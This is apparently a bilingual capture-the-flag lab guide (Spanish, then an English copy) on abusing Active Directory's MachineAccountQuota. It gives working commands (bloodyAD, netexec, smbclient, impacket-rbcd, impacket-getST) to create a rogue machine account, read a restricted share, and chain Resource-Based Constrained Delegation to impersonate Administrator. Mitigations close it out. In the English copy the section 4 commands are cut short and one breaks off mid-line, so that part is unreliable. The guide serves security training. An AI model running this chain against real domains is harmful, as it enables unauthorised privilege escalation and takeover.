Objetivo

ms-DS-MachineAccountQuota vale 10, así que cualquier usuario del dominio puede dar de alta cuentas de equipo. Crea la tuya, autentícate como esa máquina y lee //DC01/computers.

Flag: //{{ ad_dc_host }}/computers/flag-ad-15.txt — captúrala en el Domain Controller y valídala en la barra lateral.

Inicio rápido

# Crear una cuenta de máquina con cualquier usuario del dominio
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  add computer evilpc 'Evil1234!'

1 · Qué es MachineAccountQuota

El atributo de dominio ms-DS-MachineAccountQuota (por defecto 10) define cuántas cuentas de equipo puede crear un usuario cualquiera. No es una vulnerabilidad por sí sola, pero es la pieza que habilita ataques como Resource-Based Constrained Delegation (RBCD) y noPac: una cuenta de máquina bajo tu control es un principal Kerberos de pleno derecho que tú manejas.

2 · Comprobar la cuota

export DC={{ ad_dc_ip }}
export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'

nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M maq

ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
# ms-DS-MachineAccountQuota: 10   → > 0 significa que podemos crear equipos

3 · Crear una cuenta de máquina

bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  add computer evilpc 'Evil1234!'
# [+] evilpc$ created

# Verifica que existe y que puedes autenticarte como esa máquina
nxc smb $DC -u 'evilpc$' -p 'Evil1234!'
nxc smb $DC -u 'evilpc$' -p 'Evil1234!' --shares

La versión de impacket (impacket-addcomputer, método SAMR por defecto) también existe, pero el SAMR de Samba exige privilegios adicionales que un usuario normal no tiene aunque la cuota lo permita — usa -method LDAPS si prefieres impacket, o directamente bloodyAD como arriba.

4 · Capturar la flag

El recurso computers es legible por Domain Computers, grupo del que tu nueva máquina es miembro automáticamente:

smbclient //$DC/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'

# o con netexec
nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \
  --share computers --get-file flag-ad-15.txt ./flag-ad-15.txt && cat flag-ad-15.txt

5 · Hasta dónde llega (RBCD)

Con una cuenta de máquina propia y permiso de escritura sobre msDS-AllowedToActOnBehalfOfOtherIdentity de un equipo objetivo, se completa el clásico RBCD:

# 1) Apuntar la delegación del objetivo a nuestra máquina
impacket-rbcd -delegate-from 'evilpc$' -delegate-to '{{ ad_dc_host }}$' \
  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip $DC
# 2) Pedir un ticket suplantando a Administrator
impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip $DC

(El paso 2 es un TGS-REQ vía S4U, con la misma limitación conocida del KDC de Samba que afecta a Kerberoasting y la delegación restringida — comando real y válido contra un DC Windows. La flag de este lab ya se captura en el paso 4.)

Mitigación

  • Poner ms-DS-MachineAccountQuota = 0 y delegar el alta de equipos solo a cuentas concretas.
  • Vigilar la creación de cuentas de equipo (evento 4741) desde usuarios no administrativos.
  • Restringir la escritura de msDS-AllowedToActOnBehalfOfOtherIdentity y aplicar los parches de noPac (CVE-2021-42278/42287).

Herramientas

impacket-addcomputer impacket-rbcd impacket-getST bloodyAD netexec (nxc)

1 · What MachineAccountQuota is

The domain attribute ms-DS-MachineAccountQuota (default 10) sets how many computer accounts any user can create. It is not a vulnerability on its own, but it is the enabler for attacks like Resource-Based Constrained Delegation (RBCD) and noPac: a machine account under your control is a first-class Kerberos principal you own.

2 · Check the quota

export DC={{ ad_dc_ip }}
export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'

nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M maq

ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
# ms-DS-MachineAccountQuota: 10   → > 0 means we can create computers

3 · Create a machine account

bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  add computer evilpc 'Evil1234!'
# [+] evilpc$ created

# Verify it exists and that you can authenticate as that machine
nxc smb $DC -u 'evilpc$' -p 'Evil1234!'
nxc smb $DC -u 'evilpc$' -p 'Evil1234!' --shares

The impacket equivalent (impacket-addcomputer, default SAMR method) also exists, but Samba's SAMR requires extra privileges a regular user doesn't have even when the quota allows it — use -method LDAPS if you prefer impacket, or just bloodyAD as above.

4 · Capture the flag

# or with netexec
nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \

5 · How far it goes (RBCD)

With your own machine account and write access over a target computer's msDS-AllowedToActOnBehalfOfOtherIdentity, you complete the classic RBCD:

# 1) Point the target's delegation at our machine
impacket-rbcd -delegate-from 'evilpc$' -delegate-to '{{ ad_dc_host }}$' \
  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip $DC
# 2) Request a ticket impersonating Administrator
impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip $DC

(Step 2 is an S4U-based TGS-REQ, hitting the same known Samba KDC limitation that affects Kerberoasting and constrained delegation — a real, valid command against a Windows DC. This lab's flag is already captured at step 4.)

Mitigation

  • Set ms-DS-MachineAccountQuota = 0 and delegate computer creation only to specific accounts.
  • Watch for computer account creation (event 4741) from non-admin users.
  • Restrict writes to msDS-AllowedToActOnBehalfOfOtherIdentity and apply the noPac patches (CVE-2021-42278/42287).

Tools

impacket-addcomputer impacket-rbcd impacket-getST bloodyAD netexec (nxc)
